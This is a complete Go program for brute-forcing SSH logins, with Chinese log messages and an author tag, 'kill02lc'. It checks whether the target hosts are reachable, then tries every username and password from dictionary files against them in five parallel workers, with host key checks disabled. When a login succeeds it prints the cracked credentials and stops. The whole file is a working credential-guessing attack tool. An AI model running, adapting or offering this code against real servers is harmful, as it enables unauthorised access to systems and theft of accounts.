package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
	"flag"
	"golang.org/x/crypto/ssh"
	"strconv"
)

type Task struct {
	ip       string
	user     string
	password string
}

func checkAlive(ip string,port string ) bool {
	alive := false
	_, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, port), time.Second*30)
	if err == nil {
		alive = true
	}
	return alive
}
func readDictFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		passwd := strings.TrimSpace(scanner.Text())
		if passwd != "" {
			result = append(result, passwd)
		}
	}
	return result, err
}
func runTask(tasks []Task, threads int,ssh_port string) {
	var wg sync.WaitGroup
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ {
		go func() {
			for task := range taskCh {
				success, _ := sshLogin(task.ip, task.user, task.password,ssh_port)
				if success {
					log.Printf("尝试破解%v成功，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
					os.Exit(-1)
				}else{
					log.Printf("尝试破解%v失败，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
				}
				wg.Done()
			}
		}()
	}
	for _, task := range tasks {
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}
func sshLogin(ip, username, password string,ssh_port string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         3 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	ssh_port_int,err_int:= strconv.Atoi(ssh_port)
	if err_int != nil {
		log.Fatalln("端口转换失败", err_int)
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, ssh_port_int), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo test")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}

func main() {
	var ip = flag.String("ip", "", "string类型参数")
	var file_ip = flag.String("file_ip", "", "string类型参数")
	var ssh_port = flag.String("ssh_port", "", "string类型参数")

	flag.Parse()
	fmt.Println("---- auth:kill02lc ----")
	fmt.Println("-ip ip地址", *ip)
	fmt.Println("-file_ip ip文件", *file_ip)
	fmt.Println("-ssh_port ssh端口", *ssh_port)

	var aliveIps []string
	if(*ip!="" && *ssh_port!=""){
	if checkAlive(*ip,*ssh_port) {
			aliveIps = append(aliveIps,*ip)
	}else{
		fmt.Println("\n")
		log.Fatalln("连接失败")
	}
	}else if(*file_ip!="" && *ssh_port!=""){
		file, err := os.Open(*file_ip)
		if err != nil {
			panic((err))
		}
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			if checkAlive(scanner.Text(),*ssh_port) {
		  aliveIps = append(aliveIps,scanner.Text())
		  }else{
			fmt.Println("\n")
		  	log.Fatalln("连接失败")
		  }
		}
	}else{
		fmt.Println("\n")
		log.Fatalln("未传递所需参数")
	}

	users, err := readDictFile("user.dic")
	if err != nil {
		log.Fatalln("读取用户名字典文件错误：", err)
	}
	passwords, err := readDictFile("pass.dic")
	if err != nil {
		log.Fatalln("读取密码字典文件错误：", err)
	}


	var tasks []Task
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range aliveIps {
				tasks = append(tasks, Task{ip, user, password})
			}
		}
	}
	runTask(tasks, 5,*ssh_port)

}
